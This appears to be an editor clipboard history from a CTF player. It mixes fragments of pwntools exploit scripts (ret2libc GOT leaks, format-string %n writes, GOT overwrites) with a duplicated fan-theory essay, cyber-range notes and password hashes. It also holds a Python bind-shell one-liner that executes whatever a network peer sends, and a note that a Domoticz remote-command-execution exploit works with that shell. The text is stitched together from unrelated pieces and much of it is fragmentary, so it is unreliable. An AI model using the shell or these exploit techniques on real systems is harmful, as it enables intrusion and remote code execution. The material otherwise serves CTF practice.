ef3e7ab365b452f0d4cfa4ffae989170|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|53|1|V|python
	PRINTF_GOT = exe.got['printf']
913de45694a7d9d6fa2a4e2b8d10bb73|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|55|1|V|python
	log_addr('Bin sh:', BINSH_ADDR)
cb8ba714613e89dbb4a548cafd56ad82|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|66|1|V|python
	io.sendline(b'c'*34 + p32(PUTS_GOT) + b'c')
8a56537ffe10da1428c8b0a6646167f8|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|67|1|V|python
	io.sendline(b'c'*34 + p32(MAIN_ADDR) + b'c')
0a715b54f322bc3ff70c53f8cb41b291|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|61|1|V|python
	io.sendline(b'/bin/sh' + b'a' * 57)
cc7a07f4979014efd08495ebb4e38a59|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|68|1|V|python
	# io.sendline(b'c'*34 + p32(SYSTEM_ADDR) + b'c')
dc46654f8231969b699c21376a55e66b|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|63|1|V|python
	# io.sendline(b'/bin/sh' + b'a' * 57)
f520d02ba14e27177e787ad47c3d6f6a|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|61|1|V|python
	# payload = 'A' * offset
5572afde65b477b50442c32e4d5cb89f|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|60|1|V|python
	# OFFSET = cyclic_find(0xdeadbeef)  # cyclic(1024)
f6d8c593f5b4868a33d443365abc1942|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|57|1|V|python
	log_addr("Puts@got:", PUTS_GOT)
26f24feceaca010ec5e2618197b78607|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|61|1|V|python
	io.recvuntil('protocol:\n')
	io.sendline(b'a' * 64)
	io.recvuntil('domain:\n')
	io.sendline(b'b' * 64)
	io.recvuntil('path:\n')
	io.sendline(b'c'*30 + p32(PUTS_PLT) + p32(MAIN_ADDR) + p32(PUTS_GOT) + b'c')
	io.recvline()
	io.recvline()
	PUTS_LIBC = u32(io.recvline()[:4])
	log_addr('Puts@libc', PUTS_LIBC)
	
a4f39794fe6f229adade122adc6f3dc3|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|80|1|v|python
	PRINTF_LIBC
ec3e3989b8649320ea51620f56807ac5|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|73|1|V|python
	io.recvuntil('protocol:\n')
	io.sendline(b'a' * 64)
	io.recvuntil('domain:\n')
	io.sendline(b'b' * 64)
	io.recvuntil('path:\n')
	io.sendline(b'c'*30 + p32(PUTS_PLT) + p32(MAIN_ADDR) + p32(STRCAT_GOT) + b'c')
	io.recvline()
	io.recvline()
	STRCAT_LIBC = u32(io.recvline()[:4])
	log_addr('Strcat@libc', STRCAT_LIBC)
9aceae2964e6e71ddbe8b4d680920944|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|89|60|v|python
	STRCAT_GOT
7e178365f83647ff2c2931de87623fbf|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|92|1|v|python
	STRCAT_LIBC
0a4211bbe10d9c4b5676ee889ef3ca73|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|93|11|v|python
	Strcat
8a3c795f2b38bff327a53e5f74e45c2e|file:///home/neo/CTFs/ccsc2020/easy_as_PIE/pie/exploit.py|121|1|V|python
	BINSH_ADDR = LIBC_BASE + next(libc.search('/bin/sh\x00')) 
	SYSTEM_ADDR = LIBC_BASE + libc.sym.system
	log.info("system@libc: %#x" % SYSTEM_ADDR)
e25647780b0a1061650d516d7fe72c75|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|84|1|V|python
	io.recvuntil('protocol:\n')
	io.sendline(b'a' * 64)
	io.recvuntil('domain:\n')
	io.sendline(b'b' * 64)
	io.recvuntil('path:\n')
	io.sendline(b'c'*30 + p32(PUTS_PLT) + p32(MAIN_ADDR) + p32(MEMSET_GOT) + b'c')
bf265df1576eee763f2365711381afea|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|105|63|v|python
	MEMSET_GOT
d5233292474feccc68859f689a1140f9|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|54|1|V|python
	# log_addr('Bin sh:', BINSH_ADDR)
23ebcab2a8b29f8e8a8d47115e38df79|file:///home/neo/CTFs/hacktivitycon2020/almost/exploit.py|50|15|v|python
	-2.30.so
942905b2d0c0d9508320006f744f8e65|file:///home/neo/CTFs/hacktivitycon2020/output/png/dff|1|1|V|diff
	11173,12428c11173
1b5be8ab563fddfb45e667a1037b510a|file:///home/neo/CTFs/hacktivitycon2020/output/png/dff|1257|1|V|diff
	---
	> 42 60 82                                       
5221ebbbc319337d2fac7c7137c3c7a2|file:///home/neo/CTFs/hacktivitycon2020/theory.txt|29|1|V|text
	29. However, it always disturbed me that Charlie accepts the factory at all. He saw the other children
	30. tortured in front of him. He doesn't have to be visibly traumatized, but accepting the factory
	31. from Wonka makes him unbothered or even complicit. At the end of Tim Burton's 2005 movie‚Äîas in
	32. the book‚Äîwe see that the other children are still alive. I can't say they're unharmed, because
	33. Violet is violet and Mike's body is stretched out. They'll all probably be traumatized for life.
	34. The 1971 movie, while considered more family-friendly, doesn't even show us whether the other
	35. kids survived.
e2b6b6646cb1f87a9b90c30f6ca6e04a|file:///home/neo/CTFs/hacktivitycon2020/p1|1|1|v|
	29. 
5695e4398f11e33bfd7959933778a233|file:///home/neo/CTFs/hacktivitycon2020/p1|2|1|v|
	30. 
8ea0f9bbe5916c9918001719dc17998d|file:///home/neo/CTFs/hacktivitycon2020/p1|3|1|v|
	31. 
ca521ac60b5b37e5d4423f7e037469c2|file:///home/neo/CTFs/hacktivitycon2020/p1|4|1|v|
	32. 
d48c494dbbb2097d0fbe72cf3bf4838b|file:///home/neo/CTFs/hacktivitycon2020/p1|5|1|v|
	33. 
8200243979bffd07e3943e47eedc1c0e|file:///home/neo/CTFs/hacktivitycon2020/p1|6|1|v|
	34. 
ab3482db2b7f50302f1be955dbbc54eb|file:///home/neo/CTFs/hacktivitycon2020/p1|7|1|v|
	35. 
3a7c0198283958aaf81e469adcd283b8|file:///home/neo/CTFs/hacktivitycon2020/theory.txt|49|1|V|text
	49. However, it always disturbed me that Charlie accepts the factory at all. He saw the other children
	50. tortured in front of him. He doesn't have to be visibly traumatized, but accepting the factory from
	51. Wonka makes him unbothered or even complicit. At the end of Tim Burton's 2005 movie‚Äîas in the
	52. book‚Äîwe see that the other children are still alive. I can't say they're unharmed, because Violet
	53. is violet and Mike's body is stretched out. They'll all probably be traumatized for life. The 1971
	54. movie, while considered more family-friendly, doesn't even show us whether the other kids survived.
8ea28a4fe416a7daba31e608892565e2|file:///home/neo/CTFs/hacktivitycon2020/p2|1|1|v|
	49. 
1ddc056fe5541758e765a7b8ceb71b34|file:///home/neo/CTFs/hacktivitycon2020/p2|2|1|v|
	50. 
90088756b97039ba0748583102b19f27|file:///home/neo/CTFs/hacktivitycon2020/p2|3|1|v|
	51. 
f654c596f401b3ac9e1ac51e027cbe42|file:///home/neo/CTFs/hacktivitycon2020/p2|4|1|v|
	52. 
43088de390df91573ffe23a4a8075cdd|file:///home/neo/CTFs/hacktivitycon2020/p2|5|1|v|
	53. 
323fb04af8f57f34a50ffd5123ffdd29|file:///home/neo/CTFs/hacktivitycon2020/p2|6|1|v|
	54. 
fc59adc8b52815d0bec3b8794a8e40c2|file:///home/neo/CTFs/hacktivitycon2020/theo.sh|1|1|V|sh
	file='./theory.txt'
2853265789e256b79fa738a80624858d|file:///home/neo/CTFs/hacktivitycon2020/theo.sh|1|5|v|sh
	peptides.txt
03b77b935cdf4d79cfa0d422584860fe|file:///home/neo/CTFs/hacktivitycon2020/theory.txt|1|1|V|text
	1. Snowpiercer takes place in a post-apocalyptic world where attempts to halt global warming
	2. have backfired, causing an ice age. The only surviving humans inhabit a socially segregated
	3. train that circumnavigates the Earth. Children are taught to worship the train's creator,
	4. Wilford, in a cult of personality. In the theory {not the movie, Wilford is actually
	5. Charlie Bucket, who inherited Willy Wonka's factory, then assumed his name and became an
	6. inventor in his own right.
	7.
	8. Intentionally or not, there are clear parallels in characters, themes, and plot between
	9. Snowpiercer and Dahl's story. The biggest plot similarities include Wilford having a
	10. supposed adversary who's actually his spy, and then asking the protagonist to be his
	11. successor. In this theory, Wonka and Wilford are both inherited roles, much like The
	12. Dread Pirate Roberts in The Princess Bride. By this logic, it actually makes sense that
	13. Charlie takes the name Willy (Wilford} Wonka, then just Wilford. The continuity makes them
	14. seem more formidable and larger than life.
	15.
	16. Fan theories like this are farfetched but fun. They're not canonical at all but basically
	17. fan fictions that let us reinterpret old favorites. Some parts are much more plausible than
	18. others. The biggest reach is interpreting Snowpiercer as a direct sequel to Dahl's story.
	19. Still, I enjoy this theory because it exposes Charlie's potential to become a sadistic or
	20. hypocritical adult, which is subtly present in Dahl's book.
	21.
	22. Charlie Bucket turning evil is actually one of the least surprising parts of the fan theory.
	23. This interpretation exaggerates an aspect of Charlie's personality that is subtle but present
	24. in the original book and its two movie adaptations. Initially, Charlie seems sweet, mature, and
	25. selfless. He sacrifices what little he has for his family and appreciates everything. He
	26. behaves much better than all the other children. A common interpretation is that Charlie deserves
	27. the factory because he's the only "good" child.
	28.
	29. However, it always disturbed me that Charlie accepts the factory at all. He saw the other children
	30. tortured in front of him. He doesn't have to be visibly traumatized, but accepting the factory
	31. from Wonka makes him unbothered or even complicit. At the end of Tim Burton's 2005 movie‚Äîas in
	32. the book‚Äîwe see that the other children are still alive. I can't say they're unharmed, because
	33. Violet is violet and Mike's body is stretched out. They'll all probably be traumatized for life.
	34. The 1971 movie, while considered more family-friendly, doesn't even show us whether the other
	35. kids survived.
	36.
	37. Although Charlie initially seems like a "good kid," he's content to keep his head down and behave
	38. correctly while other kids get punished. People have written entire articles explaining how Charlie's
	39. Grandpa Joe is an awful role model. He and Charlie feel entitled to Wonka's prize as the only people
	40. who never broke the rules. But they did! They drank Wonka's soda that made them levitate, then had
	41. to drink the antidote to come down. Grandpa Joe is already teaching Charlie to be hypocritical and
	42. self-righteous.Charlie Bucket turning evil is actually one of the least surprising parts of the
	43. fan theory. This interpretation exaggerates an aspect of Charlie's personality that is subtle
	44. but present in the original book and its two movie adaptations. Initially, Charlie seems sweet,
	45. mature, and selfless. He sacrifices what little he has for his family and appreciates everything.
	46. He behaves much better than all the other children. A common interpretation is that Charlie
	47. deserves the factory because he's the only "good" child.
	48.
	49. However, it always disturbed me that Charlie accepts the factory at all. He saw the other children
	50. tortured in front of him. He doesn't have to be visibly traumatized, but accepting the factory from
	51. Wonka makes him unbothered or even complicit. At the end of Tim Burton's 2005 movie‚Äîas in the
	52. book‚Äîwe see that the other children are still alive. I can't say they're unharmed, because Violet
	53. is violet and Mike's body is stretched out. They'll all probably be traumatized for life. The 1971
	54. movie, while considered more family-friendly, doesn't even show us whether the other kids survived.
	55.
	56. Although Charlie initially seems like a "good kid," he's content to keep his head down and behave
	57. correctly while other kids get punished. People have written entire articles explaining how Charlie's
	58. Grandpa Joe is an awful role model. He and Charlie feel entitled to Wonka's prize as the only people
	59. who never broke the rules. But they did! They drank Wonka's soda that made them levitate, then had to
	60. drink the antidote to come down. Grandpa Joe is already teaching Charlie to be hypocritical and
	61. self-righteous.
	62.
	63. If you like the fan theory, it's possible to imagine Charlie changing from a sweet kid to a ruthless
	64. cult leader as an adult. This could happen if he has terrible role models, like Grandpa Joe and
	65. Wonka. His experiences could lead to voyeurism, egoism, sadism, and a sense of moral superiority as
	66. an adult. He could grow up to be a cult leader in a post-apocalyptic world, especially after he was
	67. given power over the factory so young. In my opinion, Charlie isn't the only kid who isn't "rotten."
	68. In a way, he's actually the worst.
	69.
	70. If you like the fan theory, it's possible to imagine Charlie changing from a sweet kid to a
	71. ruthless cult leader as an adult. This could happen if he has terrible role models, like
	72. Grandpa Joe and Wonka. His experiences could lead to voyeurism, egoism, sadism, and a sense
	73. of moral superiority as an adult. He could grow up to be a cult leader in a post-apocalyptic
	74. world, especially after he was given power over the factory so young. In my opinion, Charlie
	75. isn't the only kid who isn't "rotten." In a way, he's actually the worst.
5fa11b72bba7393f8bbdee3f5f37323d|file:///home/neo/pwnablexyz/sus/exploit.py|47|1|V|python
	WIN_ADDR_OFFSET = exe.sym.win
e6234915b1ef408e9fbeb5e981741daf|file:///home/neo/pwnablexyz/sus/exploit.py|47|1|V|python
	MAX_INT = 0x7fffffff
c4dbad36f806e75d13a817ee62824eb5|file:///home/neo/pwnablexyz/sus/exploit.py|48|1|V|python
	CMD_OFFSET = exe.sym.cmd
a34da7bd50075bb83685f5eb0930a98b|file:///home/neo/pwnablexyz/sus/exploit.py|54|1|V|python
	io.recvuntil('> ')
	io.sendline('1')
	io.recvuntil('Name: ')
	io.send('\x00')
	io.recvuntil('Age: ')
	io.sendline('20')
9cd0f1657a46cfd13f7e3172c3008dfa|file:///home/neo/pwnablexyz/sus/exploit.py|61|1|V|python
	io.recvuntil('> ')
	io.sendline('1')
	io.recvuntil('Name: ')
	io.send('\x00'*8)
	io.recvuntil('Age: ')
	io.sendline('20')
76ba4a3cca575779b334a387c5f100a6|file:///home/neo/pwnablexyz/sus/exploit.py|56|1|V|python
	io.recvuntil('Name: ')
	io.send('neo')
	io.recvuntil('Age: ')
0d21887e2339453046a0c7cc427f2be2|file:///home/neo/pwnablexyz/sus/exploit.py|62|1|V|python
	io.recvuntil('> ')
	io.sendline('3')
	io.recvuntil('Name: ')
	io.send('neo')
	io.recvuntil('Age: ')
0dc9baa37a8f3439672986ba4a9c2cfc|file:///home/neo/pwnablexyz/sus/exploit.py|73|1|V|python
	# Override printf's got entry with win addr
449789e9195cc2efe489cd8a265f0316|file:///home/neo/pwnablexyz/sus/exploit.py|67|1|V|python
	# Overwrite pointer to name buffer with a got entry
41049fdf24dd301537dfa0fae4b022c3|file:///home/neo/pwnablexyz/sus/exploit.py|76|1|V|python
	# io.sendline('0')
	
	# io.recvuntil('> ')
	# io.sendline('2')
d7a296c12ea9ebda81af230b4f4e529a|file:///home/neo/pwnablexyz/fspoo/exploit.py|70|38|v|python
	 # !!
906991cfcc4309dce906a4f71b29608a|file:///home/neo/pwnablexyz/fspoo/exploit.py|60|1|V|python
	line = io.recvline()[:-1]
	log.info(line)
7437c7f3e2078da61d0c9be1d39aff6b|file:///home/neo/pwnablexyz/fspoo/exploit.py|71|19|V|python
	vuln_ret = u32(io.recvline()[:4])
	log_addr("Vuln ret", vuln_ret)
ecef1235d4a828f786770562f5d7199c|file:///home/neo/pwnablexyz/fspoo/exploit.py|74|1|V|python
	log.info(vuln_ret)
11e77c161fd25d5994f8f15d8a9d7d5a|file:///home/neo/pwnablexyz/fspoo/exploit.py|74|1|V|python
	# log_addr("Vuln ret", vuln_ret)
db7406aeeb7031e1fa72092a614cbd87|file:///home/neo/pwnablexyz/fspoo/exploit.py|67|1|V|python
	io.sendlineafter('> ', '1')
	io.recvuntil('Name: ')
	io.sendline(b'a' * OFFSET + b"%11$p")
	io.sendlineafter('> ', '2')
81d0e9cda0359961274e183a213017a5|file:///home/neo/pwnablexyz/fspoo/exploit.py|75|31|v|python
	DATA_OFFSET
ceaac5ce2b4a44b9fa8d8075dcc7b7f5|file:///home/neo/pwnablexyz/fspoo/exploit.py|76|24|v|python
	str(DATA_ADDR & 0xFFFFFF00 | 1))
c4804f5623441a21de54945bfcd6b444|file:///home/neo/pwnablexyz/fspoo/exploit.py|75|1|V|python
	log.info(str(DATA_ADDR & 0xFFFFFF00 | 1))
88cdf0430f56c2fdc4b5440c627abe81|file:///home/neo/pwnablexyz/fspoo/exploit.py|76|1|V|python
	log.info(hex(DATA_ADDR & 0xFFFFFF00 | 1))
33e7e0e37c4d0e4f470b71ab1751a8c9|file:///home/neo/pwnablexyz/fspoo/exploit.py|76|1|V|python
	io.sendlineafter('> ', str(DATA_ADDR & 0xFFFFFF00 | 1))
74985520a96585da43e5d1a399b532af|file:///home/neo/pwnablexyz/fspoo/exploit.py|80|1|V|python
	# io.sendlineafter('> ', '2')
4779e282dec7b3843c80c34557eba4d1|file:///home/neo/pwnablexyz/fspoo/exploit.py|79|1|V|python
	io.sendlineafter('> ', str(DATA_ADDR & 0xFFFFFF00 | 2))
df89f1597e562150ec119b07fff4c140|file:///home/neo/pwnablexyz/fspoo/exploit.py|84|32|v|python
	DATA_ADDR & 0xFFFFFF00 | 2
622d309a68aa3214fb9464ac633fd46f|file:///home/neo/pwnablexyz/fspoo/exploit.py|62|1|V|python
	log_addr("Cmd + 48", cmd_addr)
54f27fe70b3a3647db0ce1e7adf08b52|file:///home/neo/pwnablexyz/fspoo/exploit.py|86|5|V|python
	    io.sendlineafter('> ', '2')
1d1123f81e05f14c4efe6b6f23dfabda|file:///home/neo/pwnablexyz/fspoo/exploit.py|67|1|V|python
	log_addr("Base", base_addr)
367f261a6f3f7393364c5b90f4cadb3b|file:///home/neo/pwnablexyz/fspoo/exploit.py|79|245|v|python
	Then, we can use the format string exploit to write at the data segment address, since the address is now written in the stack
73eb1b744db8267eb2a41f14c52533f0|file:///home/neo/pwnablexyz/fspoo/exploit.py|29|13|V|python
	            b vuln
beac805829ccbeca5a888f572cfcc0c6|file:///home/neo/pwnablexyz/fspoo/exploit.py|87|106|v|python
	, so that we can usem to write more bytes as the format string
9e7988e327054294d9ca39bf461fc454|file:///home/neo/pwnablexyz/fspoo/exploit.py|80|1|V|python
	DATA_ADDR = base_addr + DATA_OFFSET
	io.sendlineafter('> ', str(DATA_ADDR & 0xFFFFFF00 | 1)) # %6$ is now pointing to data segment
	io.recvuntil('Name: ')
	# Add two more 'a's because of the two newlines
	io.sendline(b'a' * (OFFSET+2) + b"%6$n")
	io.sendlineafter('> ', str(DATA_ADDR & 0xFFFFFF00 | 2))
1cad7a3dc176a356684bae40985a31cc|file:///home/neo/pwnablexyz/fspoo/exploit.py|79|1|V|python
	log_addr("Menu end", menu_end)
	DATA_ADDR = base_addr + DATA_OFFSET
	io.sendlineafter('> ', str(DATA_ADDR & 0xFFFFFF00 | 1)) # %6$ is now pointing to data segment
	io.recvuntil('Name: ')
	# Add two more 'a's because of the two newlines
	io.sendline(b'a' * (OFFSET+2) + b"%6$n")
	io.sendlineafter('> ', str(DATA_ADDR & 0xFFFFFF00 | 2))
a472f4af3915459f56635951e666b18d|file:///home/neo/pwnablexyz/fspoo/exploit.py|90|23|v|python
	 str(DATA_ADDR & 0xFFFFFF00 | 1)) # %6$ is now pointing to data segment
a56a44b5c724b57e71dbd8cd259d05ce|file:///home/neo/pwnablexyz/fspoo/exploit.py|94|24|v|python
	str(DATA_ADDR & 0xFFFFFF00 | 2))
306d09481622f34e95a225bc2c02ad99|file:///home/neo/pwnablexyz/fspoo/exploit.py|78|1|V|python
	# However, we can use our choice input to control the address where we write
6c008495a93c6af76f91c237b8057dfd|file:///home/neo/pwnablexyz/fspoo/exploit.py|78|194|v|python
	to write at and just set the last byte to the choice we want. 
9d4354bce80a58611821035c769fe135|file:///home/neo/pwnablexyz/fspoo/exploit.py|95|1|V|python
	# We need to keep putting a writable address in the menu choice whenever we write an 'n' in the format string, so that the program doesnt crash
8d3be69d2edb4b52c47667a4c4e82c58|file:///home/neo/pwnablexyz/fspoo/exploit.py|83|1|V|python
	io.sendlineafter('> ', str(DATA_ADDR & 0xFFFFFF00 | 1)) # %6$ is now pointing to data segment
	io.recvuntil('Name: ')
	# Add two more 'a's to fill all 6 available bytes
	io.sendline(b'a' * (OFFSET+2) + b"%6$n")
	io.sendlineafter('> ', str(DATA_ADDR & 0xFFFFFF00 | 2))
78455dc4de4da77be9396b8dd4943feb|file:///home/neo/pwnablexyz/fspoo/exploit.py|103|1|V|python
	# Add two more 'a's to fill all 6 available bytes
ed5d4246c154198f0df3384dddbaa274|file:///home/neo/pwnablexyz/fspoo/exploit.py|103|13|v|python
	b'a' * (OFFSET+2) + b"%6$n"
bc9affce208941bdca33792fcc6e34a3|file:///home/neo/pwnablexyz/fspoo/exploit.py|99|1|V|python
	log.info('First half: %x', first_half)
f534d11c18bd78a7d43404f91ec55748|file:///home/neo/pwnablexyz/fspoo/exploit.py|101|29|v|python
	first_half
f23ff117d125162f1fae13925b9cf629|file:///home/neo/pwnablexyz/fspoo/exploit.py|104|1|V|python
	io.sendlineafter('> ', str(DATA_ADDR & 0xFFFFFF00 | 1)) # %6$ is now pointing to data segment
68f0fd54a70d6de1f4bf2a69bafd123b|file:///home/neo/pwnablexyz/fspoo/exploit.py|107|24|v|python
	str(DATA_ADDR & 0xFFFFFF00 | 1)) # %6$ is now pointing to data segment
7ff65312504cfe8b9ac1e09aa8ce84a9|file:///home/neo/pwnablexyz/fspoo/exploit.py|104|1|V|python
	io.sendlineafter('> ', str(DATA_ADDR & 0xFFFFFF00 | 1)) # %6$ is now pointing to data segment
	io.recvuntil('Name: ')
	io.sendline(b'%' + first_half + b'c%6$n')
	io.sendlineafter('> ', vuln_ret_stack)
ee43b75958d51318211daca487450cf0|file:///home/neo/pwnablexyz/fspoo/exploit.py|106|1|V|python
	log.info('Writing new format string')
e5926e4de2231679639caaef0d286613|file:///home/neo/pwnablexyz/fspoo/exploit.py|108|11|v|python
	Wting new format string
25e09849abfa3909e600b33554a43951|file:///home/neo/pwnablexyz/fspoo/exploit.py|109|1|V|python
	log.info(vuln_ret_stack)
495ac4f3f093267ed2d2f7f61da03515|file:///home/neo/pwnablexyz/fspoo/exploit.py|110|10|v|python
	vuln_ret_stack
60d7218c64fb36ff6b1e45ef349fa94f|file:///home/neo/pwnablexyz/fspoo/exploit.py|109|24|V|python
	log.info(vuln_ret_stack)
	log.info(hex(vuln_ret_stack))
032fb88771f9be15daf4d4515ad3802d|file:///home/neo/pwnablexyz/fspoo/exploit.py|109|24|v|python
	str(vuln_ret_stack).encode())
4a9fa1d40affe42eede78ec971a377f3|file:///home/neo/pwnablexyz/fspoo/exploit.py|108|1|V|python
	log.info('Writing vuln ret address')
ae4b43809798b25717a21d7dbb5502f5|file:///home/neo/pwnablexyz/fspoo/exploit.py|112|1|V|python
	io.sendlineafter('> ', str(DATA_ADDR & 0xFFFFFF00 | 1)) # %6$ is now pointing to data segment
	io.recvuntil('Name: ')
	io.sendline(b'%' + str(second_half).encode() + b'c%6$n\x00')
	io.sendlineafter('> ', str(vuln_ret_stack))
e6d47b597cf6d646d6022376ba7968ed|file:///home/neo/pwnablexyz/fspoo/exploit.py|104|1|V|python
	io.sendlineafter('> ', str(DATA_ADDR & 0xFFFFFF00 | 1)) # %6$ is now pointing to data segment
	io.recvuntil('Name: ')
	log.info('Writing new format string')
	io.sendline(b'%' + str(first_half).encode() + b'c%6$n\x00')
	io.recvuntil('> ')
	log.info('Writing vuln ret address')
	io.sendline(p32(vuln_ret_stack))
63680a54b25055d21ed3bbbe38d0b3cd|file:///home/neo/pwnablexyz/fspoo/exploit.py|112|1|V|python
	# io.sendlineafter('> ', str(DATA_ADDR & 0xFFFFFF00 | 1)) # %6$ is now pointing to data segment
	# io.recvuntil('Name: ')
	# log.info('Writing new format string')
	# io.sendline(b'%' + str(second_half).encode() + b'c%6$n\x00')
	# io.recvuntil('> ')
	# log.info('Writing vuln ret address')
	# io.sendline(p32(vuln_ret_stack))
749923da722b03b74af3c7df702daa7d|file:///home/neo/pwnablexyz/fspoo/exploit.py|103|1|V|python
	# Use %Nc to write N bytes
	io.sendlineafter('> ', str(DATA_ADDR & 0xFFFFFF00 | 1)) # %6$ is now pointing to data segment
	io.recvuntil('Name: ')
	log.info('Writing new format string')
	io.sendline(b'%' + str(first_half-12).encode() + b'c%6$hn\x00')
	io.recvuntil('> ')
	log.info('Writing vuln ret address')
	io.sendline(str(vuln_ret_stack - 2**32))
f4cb31380748ac252950bcc38fbbfd53|file:///home/neo/pwnablexyz/fspoo/exploit.py|104|1|V|python
	io.sendlineafter('> ', str(DATA_ADDR & 0xFFFFFF00 | 1)) # %6$ is now pointing to data segment
	io.recvuntil('Name: ')
	log.info('Writing new format string')
	io.sendline(b'%' + str(first_half-12).encode() + b'c%6$hn\x00')
	io.recvuntil('> ')
	log.info('Writing vuln ret address')
	io.sendline(str(vuln_ret_stack - 2**32))
d67176660b04a2cd1a947c87bd2d2725|file:///home/neo/pwnablexyz/fspoo/exploit.py|108|1|V|python
	print(first_half)
d9f62a6e159fbb92f721a9ef0dddb56d|file:///home/neo/pwnablexyz/jump/exploit.py|55|1|V|python
	io.recvuntil('> ')
	io.sendline('1')
	io.recvuntil('Name: ')
	io.sendline('neo')
	io.recvuntil('Age: ')
	io.sendline('20')
	
	# Overwrite pointer to name buffer with a got entry
	io.recvuntil('> ')
	io.sendline('3')
	io.recvuntil('Name: ')
	io.sendline('neo')
	io.recvuntil('Age: ')
	io.sendline(b'a'*16 + p64(PRINTF_GOT))
	
	# Override printf's got entry with win addr
	io.recvuntil('> ')
	io.sendline('3')
	io.recvuntil('Name: ')
	io.sendline(p64(WIN_ADDR))
	# This printf will jump to win
	# io.recvuntil('Age: ')
fb497738882d19b79a75d41fdbe647bd|file:///home/neo/pwnablexyz/jump/exploit.py|29|1|V|python
	            b create_user
	            b print_user
	            b edit_usr
3bc92f40c2007270dc676db1528a0fb4|file:///home/neo/pwnablexyz/jump/exploit.py|29|1|V|python
	            b *(main+84)
7d8a80fb4165e60ef09162a3f8418cd1|untitled:1|1|1|V|
	python -c "import socket as a;s = a.socket();s.bind(('0.0.0.0',4444));s.listen(1);(r,z) = s.accept();exec(r.recv(999))"
fb18c39c988ebba4f5700b07d48f9dc8|untitled:1|1|1|V|
	import socket as a;s = a.socket();s.bind(('0.0.0.0',4444));s.listen(1);(r,z) = s.accept();exec(r.recv(999))
68baba473f979f4f792accf561725b33|file:///home/neo/cyberranges/work/producer.md|20|2|V|vimwiki
	### 46773 - Domoticz 4.10577 - Unauthenticated Remote Command Execution
	**RCE works**
	https://www.exploit-db.com/exploits/46773
	Python bind shell works through rce, however if user fails first try, port will stay bound and it will be difficult for user to free it to retry
900d099bc71430d130721db466d541f4|file:///home/neo/pwnablexyz/jump/exploit.py|56|1|V|python
	log_addr("environ", environ)
a2a29c260d69badce71c62953b7ebf03|file:///home/neo/pwnablexyz/jump/exploit.py|56|1|V|python
	BASE_ADDR = environ_addr - exe.sym.environ
537a05e6943cd024d8955e09d4ba16f9|file:///home/neo/pwnablexyz/jump/exploit.py|56|1|V|python
	log_addr("Binary base", BASE_ADDR)
4536e00795e6c6c6513ddb686d7f06b5|file:///home/neo/cyberranges/hash.txt|1|1|V|text
	AC4ACD4E2CA13E80AAD3B435B51404EE
1c8b4cf65a43de85d8a55fa379dc8713|file:///home/neo/cyberranges/hash.txt|1|1|V|text
	30EF6BD2540EB0CB7010D769538AEBA8
1d7e0ec5e3174e21bcac765735bdb97b|file:///home/neo/cyberranges/hash.txt|1|1|^v|text
	Crack the following NetNTLMv2 hash: c
fcfdf67da8e997e55e911d931c18433d|file:///home/neo/cyberranges/work/problematic.md|3|1|V|vimwiki
	- John cant find first password
4588a5f31a0537d197f49135e30da7a2|file:///home/neo/cyberranges/work/problematic.md|12|1|V|vimwiki
	- Nothing li
e54c7d1db97ed0b0f80f71e85cc74326|file:///home/neo/pwnablexyz/jump/exploit.py|61|1|V|python
	log_addr("Base", binary_base)
7863e0a52fa47f9b8d474b75c41ec8c0|file:///home/neo/pwnablexyz/jump/exploit.py|59|1|V|python
	binary_base = environ_addr - OFFSET
981556bf2c070bc80b95037b9c8a9aa2|file:///home/neo/pwnablexyz/jump/exploit.py|51|1|V|python
	OFFSET = 0x2aaaaaaa9f48
f8bedf1fdcca1203b8ad94daa2db4f6f|file:///home/neo/pwnablexyz/jump/exploit.py|61|1|V|python
	# By passing this as the 33rd byte of our choice, we can ovewrite the last byte of the return address with the number of our choice (contents of al register)
	# By setting our choice to 0x77
	choice = 0x77
	# Choice 2 xor last 4 bytes at rbp - 8 with byte at rbp - 0x11 (in this case last byte of return addr) and put the result back in rbp - 8
7739222a2bbfe6593245ab374c028608|file:///home/neo/pwnablexyz/jump/exploit.py|61|1|V|python
	# By passing this as the 33rd byte of our choice, we can ovewrite the last byte of the return address with the number of our choice (contents of al register)
	# By setting our choice to 0x77
	choice = 0x77
	# Choice 2 xor last 4 bytes at rbp - 8 with byte at rbp - 0x11 (in this case last byte of return addr) and put the result back in rbp - 8
	
e515c3cf023fed449d1a7a5d487b6dff|file:///home/neo/pwnablexyz/jump/exploit.py|63|1|V|python
	# By passing this as the 33rd byte of our choice, we can ovewrite the last byte of the return address with the number of our choice (contents of al register)
bc030c670a33e6fbee638542314b5d2c|file:///home/neo/pwnablexyz/jump/exploit.py|71|1|V|python
	# Choice 2 xor last 4 bytes at rbp - 8 with byte at rbp - 0x11 (in this case last byte of return addr) and put the result back in rbp - 8
07ccfe360dce69b84595428e2ec1c1cc|file:///home/neo/pwnablexyz/jump/exploit.py|73|6|v|python
	also
b5db21c3efe05333770f7da336313fd6|file:///home/neo/pwnablexyz/jump/exploit.py|73|1|V|python
	# We first have to change the canary value so the function can be called
f495b6c45db1eb68bbabe4c96939b801|file:///home/neo/pwnablexyz/jump/exploit.py|71|1|V|python
	io.recvuntil('> ')
	io.sendline('a'*32 + chr(byte_val))
70f4d0d36a7ab17224a454fb8036bd87|file:///home/neo/pwnablexyz/jump/exploit.py|81|23|v|python
	chr(byte_val
36dcf2ff3d9f89d12750ef974254325f|file:///home/neo/pwnablexyz/jump/exploit.py|76|1|V|python
	io.recvuntil('> ')
	io.sendline(choice)
